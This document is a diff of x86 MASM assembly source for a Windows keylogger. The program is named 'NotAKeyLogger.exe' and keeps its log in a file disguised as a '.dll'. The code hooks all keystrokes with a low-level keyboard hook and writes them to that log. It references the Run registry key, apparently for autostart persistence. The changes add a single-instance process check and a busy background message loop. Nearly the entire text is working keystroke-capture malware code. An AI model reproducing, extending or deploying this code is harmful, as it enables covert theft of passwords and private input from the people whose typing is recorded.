@@ -5,20 +5,25 @@ MakeOrOpenFile PROTO
 WriteSpecialKeyToFile PROTO :DWORD
 WinMain PROTO :DWORD, :DWORD, :DWORD, :DWORD
 CheckPowerButton PROTO
+CompareStrings PROTO :DWORD, :DWORD
 InstallHook PROTO :DWORD
 UninstallHook PROTO 
+Process32Next PROTO :DWORD, :DWORD
+Process32First PROTO :DWORD, :DWORD
 
 .DATA
 caps DWORD ')PC(', 0
 powerButton DWORD ')BP(', 0
-
-fileLocation db 'C:\NotAKeyLogger.exe', 0
+fileLocation db 'D:\NotAKeyLogger.exe', 0
 valueName db 'NotAKeyLogger', 0
 autoKey db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
-newLine BYTE " ", 13, 10, 0
-fileName BYTE 'C:\NotALogOfKeyLogger.dll', 0
+newLine db " ", 13, 10, 0
+fileName db 'D:\NotALogOfKeyLogger.dll', 0
+processName db 'NotAKeyLogger.exe', 0
 
-stm SYSTEMTIME <>
+launchedProcessInfo PROCESS_INFORMATION <>																		;struct of process info
+stm SYSTEMTIME <>																													;struct for datetime
+
 ORG stm
 wYear		dw 0
 wMonth		dw 0
@@ -36,6 +41,7 @@ timeformat db "hh:mm:ss tt",0
 
 .DATA?
 hInstance dd ?
+otherProcesshInstance dd ?
 hookInstance dd ?
 lpszCmdLine dd ?
 fileDescriptor HANDLE ?
@@ -46,33 +52,56 @@ hHook dd ?
 programInstance dd ?
 
 .CODE
-MAIN:
-						INVOKE			MakeOrOpenFile
+MAIN:				
+						call					Start
+						INVOKE				ExitProcess, 0
+
+Start PROC
+LOCAL				hProcessSnap:HANDLE 
+LOCAL				process:PROCESSENTRY32
+
 						INVOKE			GetModuleHandle, NULL
 						mov				hInstance, eax				
-
+						INVOKE			CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0							;snapshot of all running processes
+						mov				hProcessSnap, eax
+						mov				process.dwSize, SIZEOF process
+						INVOKE			Process32First, hProcessSnap, ADDR process										;check if something exists in snapshot
+						test				eax, eax
+						je					ContinueExec	
+LoopOverProc:	
+						INVOKE			Process32Next, hProcessSnap, ADDR process
+						cmp				eax, ERROR_SUCCESS
+						je					ContinueExec
+						cmp				eax, ERROR_NO_MORE_FILES
+						je					ContinueExec																						;no more processes, and our was not found as well
+						lea				esi, processName
+						lea				edi, process.szExeFile
+						mov				ecx, 18
+						repz				cmpsb 
+						jnz				LoopOverProc																						;not equal
+						call				GetCurrentProcessId																			;check if found process is not our launched one
+						cmp				eax, process.th32ProcessID
+						je					LoopOverProc
+						ret																														;if not, then exit 
+ContinueExec:
+						INVOKE			MakeOrOpenFile
 						INVOKE			GetCommandLine
 						mov				lpszCmdLine, eax
 
-						INVOKE			WinMain, hInstance, 
-											NULL,
-											lpszCmdLine,
-											SW_SHOWDEFAULT
+						INVOKE			WinMain, hInstance, NULL, lpszCmdLine, SW_SHOWDEFAULT
+
+Start ENDP
 
 ;***************** Stay As Background Process ************************
 
 WinMain PROC hInst:DWORD, hPrevInst:DWORD, szCmdLine:DWORD, nShowCmd:DWORD
 
-LOCAL	msg:MSG
+LOCAL				msg:MSG
 
-						INVOKE			InstallHook, hInstance
-						lea				edx, msg
-MessagePump:  INVOKE			GetMessage, edx, NULL, 0, 0
-						cmp				eax, 0
-						je					MessageEnd
-						jmp				MessagePump																	; loop to keep alive	
-MessageEnd:		INVOKE			UninstallHook
-						ret
+					    INVOKE			InstallHook, hInstance
+MessagePump:  
+						INVOKE			PeekMessage, ADDR msg, 0, 0, 0, 0
+						jmp				MessagePump																					;loop to keep alive	
 
 WinMain ENDP
 
@@ -121,7 +150,7 @@ MakeOrOpenFile ENDP
 
 WriteToFile PROC msg:DWORD
 						
-						mov			edi, msg																		  ;get length of string to write in file
+						mov			edi, msg																							 ;get length of string to write in file
 						xor			ecx, ecx
 						xor			al, al				
 						not			ecx
@@ -129,28 +158,25 @@ WriteToFile PROC msg:DWORD
 						repne		scasb
 						not			ecx
 						dec			ecx
-						INVOKE		WriteFile, fileDescriptor, [msg], ecx, ADDR nBytes, 0          ;keys are logging one by one
+						INVOKE		WriteFile, fileDescriptor, [msg], ecx, ADDR nBytes, 0								;keys are logging one by one
 						ret
 
 WriteToFile ENDP
 
-;*******************Install Hooks***********************
+;*******************Install Hooks************************************
 
 InstallHook PROC pInst:DWORD
 
 						push			pInst
 						pop			programInstance
 						lea			ecx, LowLevelKeyboardProc
-						INVOKE		SetWindowsHookEx,  WH_KEYBOARD_LL,
-																		ecx,
-																		hookInstance,
-																		NULL
+						INVOKE		SetWindowsHookEx,  WH_KEYBOARD_LL, ecx, hookInstance, 0
 						mov			hHook, eax
 						ret
 
 InstallHook ENDP
 
-;*******************Uninstall Hooks*********************
+;*******************Uninstall Hooks**********************************
 
 UninstallHook PROC
 
@@ -159,17 +185,17 @@ UninstallHook PROC
 
 UninstallHook ENDP
 
-;******************Main Event Hook*********************
+;******************Main Event Hook**********************************
 
 LowLevelKeyboardProc PROC nCode:SDWORD, wParam:DWORD, lParam:DWORD
 
 									mov			eax, nCode
-									cmp			eax, 0FFFFFFFFh														;check if neg number
+									cmp			eax, 0FFFFFFFFh																	;check if neg number
 									jge			CheckParams
 									jmp			CallNextHook
-
-CheckParams:				mov			eax, lParam
-									and			eax, 8000000h														;getting 31 bit to check repeat count
+CheckParams:				
+									mov			eax, lParam
+									and			eax, 8000000h																	;getting 31 bit to check repeat count
 									test			eax, eax
 									jnz			CallNextHook
 									mov			eax, wParam
@@ -178,33 +204,33 @@ CheckParams:				mov			eax, lParam
 									cmp			eax, WM_SYSKEYDOWN											
 									je				CheckIfKeyIsSpecial       	
 									jmp			CallNextHook
-
-CheckIfKeyIsSpecial:		call			CheckCapital
+CheckIfKeyIsSpecial:		
+									call			CheckCapital
 									test			eax, eax
 									jnz			WriteCapsLockKey
 									INVOKE		CheckPowerButton
 									test			eax, eax
 									jnz			WritePowerButton
 									jmp			WriteKey
-
-WriteCapsLockKey:			INVOKE		WriteToFile, OFFSET caps
+WriteCapsLockKey:			
+									INVOKE		WriteToFile, OFFSET caps
 									jmp			WriteKey
-
-WritePowerButton:			INVOKE		WriteToFile, OFFSET powerButton
-									INVOKE		ExitProcess, 0														;can be modified later
-
-WriteKey:						INVOKE		WriteToFile, lParam
+WritePowerButton:			
+									INVOKE		WriteToFile, OFFSET powerButton
+									INVOKE		ExitProcess, 0																	;can be modified later
+WriteKey:						
+									INVOKE		WriteToFile, lParam
 									jmp			PostCall
-
-PostCall:						INVOKE		CallNextHookEx, hHook, nCode, WM_KEYUP, lParam	
+PostCall:						
+									INVOKE		CallNextHookEx, hHook, nCode, WM_KEYUP, lParam	
 									ret
-
-CallNextHook:				INVOKE		CallNextHookEx, hHook, nCode, wParam, lParam
+CallNextHook:				
+									INVOKE		CallNextHookEx, hHook, nCode, wParam, lParam
 									ret
 
 LowLevelKeyboardProc ENDP
 
-;**************Check If Capital Key Is Pressed*************
+;**************Check If Capital Key Is Pressed***************************
 
 CheckCapital PROC
 									xor			esi, esi
@@ -217,7 +243,7 @@ Exit:								ret
 
 CheckCapital ENDP
 
-;**************Check If Power Button Was Pressed*********
+;**************Check If Power Button Was Pressed************************
 
 CheckPowerButton PROC 
 
